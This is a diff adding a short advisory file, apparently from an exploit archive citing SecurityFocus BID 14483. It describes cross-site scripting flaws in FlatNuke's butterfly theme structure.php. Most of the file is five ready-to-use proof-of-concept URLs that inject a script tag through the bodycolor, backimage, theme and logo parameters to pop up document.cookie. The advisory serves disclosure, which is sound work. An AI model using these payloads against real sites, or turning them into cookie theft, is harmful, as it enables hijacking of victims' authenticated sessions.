@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/14483/info
+
+FlatNuke is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit these vulnerabilities to inject html and script code into the Web browser of an unsuspecting victim.The attacker may then steal cookie-based authentication credentials. Other attacks are also possible. 
+
+http://[target]/[path]/themes/butterfly/structure.php?bodycolor="><script>alert(document.cookie)</script>
+http://[target]/[path]/themes/butterfly/structure.php?backimage="><script>alert(document.cookie)</script>
+http://[target]/[path]/themes/butterfly/structure.php?backimage=whatever&theme="><script>alert(document.cookie)</script>
+http://[target]/[path]/themes/butterfly/structure.php?backimage=whatever&bodycolor="><script>alert(document.cookie)</script>
+http://[target]/[path]/themes/butterfly/structure.php?logo="><script>alert(document.cookie)</script>
